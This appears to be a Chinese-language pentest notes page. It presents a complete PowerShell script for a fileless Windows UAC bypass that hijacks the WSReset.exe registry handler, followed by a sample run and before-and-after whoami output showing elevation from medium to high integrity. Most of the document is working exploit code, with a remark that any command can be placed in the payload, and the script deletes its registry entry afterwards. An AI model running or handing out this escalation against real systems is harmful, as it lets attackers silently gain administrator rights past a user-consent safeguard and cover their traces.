# UAC Bypass WSReset

将下列文件保存为`1.ps1`
```
<#
.SYNOPSIS
Fileless UAC Bypass by Abusing Shell API

Author: Hashim Jawad of ACTIVELabs

.PARAMETER Command
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-WSResetBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"

This will effectivly start cmd.exe in high integrity context.

.NOTES
This UAC bypass has been tested on the following:
 - Windows 10 Version 1803 OS Build 17134.590
 - Windows 10 Version 1809 OS Build 17763.316
#>

function Invoke-WSResetBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )

      $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      # 覆盖创建一个注册表
      New-Item $CommandPath -Force | Out-Null 
      # 写入一个名为DelegateExecute的键值值为空
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      # 设置“默认”的键值值为需要执行的命令
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
      Write-Host "[+] Registry entry has been created successfully!"
      # 以无窗口模式运行C:\Windows\System32\WSReset.exe程序
      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      Write-Host "[+] Starting WSReset.exe"

      Write-Host "[+] Triggering payload.."
      # 延时5秒
      Start-Sleep -Seconds 5

      if (Test-Path $filePath) {
      # 删除注册表
      Remove-Item $filePath -Recurse -Force
      Write-Host "[+] Cleaning up registry entry"
      }
}
```

```
PS C:\Users\Admin\Desktop\root> Import-Module .\1.ps1
PS C:\Users\Admin\Desktop\root> Invoke-WSResetBypass
[+] Registry entry has been created successfully!
[+] Starting WSReset.exe
[+] Triggering payload..
PS C:\Users\Admin\Desktop\root>
```

> 如果成功将会弹出管理员cmd
>
> 也可以将$Command变量内容替换为任意命令

普通权限

```
PS C:\Users\Admin\Desktop\root> whoami /groups

组信息
-----------------

组名                                   类型   SID          属性
====================================== ====== ============ ==============================
Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户和管理员组成员    已知组 S-1-5-114    只用于拒绝的组
BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组
BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
CONSOLE LOGON                          已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户                  已知组 S-1-5-113    必需的组, 启用于默认, 启用的组
LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192
```

管理员权限

```
C:\Windows\system32>whoami /groups

组信息
-----------------

组名                                 类型   SID          属性
==================================== ====== ============ ==========================================
Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户和管理员组成员  已知组 S-1-5-114    必需的组, 启用于默认, 启用的组
BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者
BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
CONSOLE LOGON                        已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户                已知组 S-1-5-113    必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\High Mandatory Level 标签   S-1-16-12288
```

